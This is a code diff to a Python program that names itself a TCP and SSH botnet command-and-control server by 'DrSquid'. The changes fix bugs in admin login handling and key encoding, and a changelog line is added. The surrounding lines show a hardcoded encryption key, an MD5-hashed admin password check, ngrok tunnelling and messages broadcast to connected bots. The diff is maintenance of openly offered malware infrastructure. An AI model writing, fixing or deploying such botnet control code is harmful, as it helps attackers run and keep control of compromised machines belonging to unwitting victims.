@@ -116,7 +116,7 @@ tar -xf {os.getcwd()}/ngrok.zip
         if arg.key is None:
             key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
         else:
-            key = bytes(arg.key)
+            key = str(arg.key).encode()
         if arg.passfile is None:
             self.usage()
         else:
@@ -445,20 +445,26 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                                 self.log(f"\n[(ERROR)]: {str(e)}")
                             hashed_passw = hashlib.md5(passw).hexdigest()
                             if hashed_passw == self.admin_password and name == self.admin_name:
-                                admin = True
-                                print(f"[!] {hostname} is an Admin!")
-                                hostname = f"ADMIN)({hostname}"
-                                msgtoadmin = f"[(SERVER)]: {hostname} is an Admin!"
-                                self.log("\n" + msgtoadmin)
-                                for admi in self.admin_conn:
+                                try:
+                                    admin = True
+                                    print(f"[!] {hostname} is an Admin!")
+                                    hostname = f"ADMIN)({hostname}"
+                                    msgtoadmin = f"[(SERVER)]: {hostname} is an Admin!"
+                                    self.log("\n" + msgtoadmin)
+                                    for admi in self.admin_conn:
+                                        try:
+                                            admi.send(msgtoadmin.encode())
+                                        except Exception as e:
+                                            self.log(f"\n[(ERROR)]: {str(e)}")
+                                    self.admin_conn.append(c)
                                     try:
-                                        admi.send(msgtoadmin.encode())
-                                    except Exception as e:
-                                        self.log(f"\n[(ERROR)]: {str(e)}")
-                                self.admin_conn.append(c)
-                                c.send(self.welcomemsg.encode())
-                                self.log(f"\n[(SERVER---->({hostname}))]: Sent welcome message.")
-                                self.admininfo.append(info)
+                                        c.send(self.welcomemsg.encode())
+                                    except:
+                                        pass
+                                    self.log(f"\n[(SERVER)---->({hostname})]: Sent welcome message.")
+                                    self.admininfo.append(info)
+                                except:
+                                    pass
                             else:
                                 c.send("Access Denied!".encode())
                                 msgtoall = f"[(ATTEMPTEDBREACHWARNING)]: {hostname} attempted to login to the botnet with incorrect credentials!\n[(ATTEMPTEDBREACHWARNING)]: Closing Connection...."
@@ -853,6 +859,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Added Web-Interface(http://127.0.0.1:8080)!
 [+] - Fixed Variable bug in regular SSH Login Function(passw-->password)
 [+] - Optimized the code a little.
+[+] - Fixed bug that kicked admins on connection.
 [+] - Added Rick Roll command.
                     """)
                 if self.instruction != "!clear":
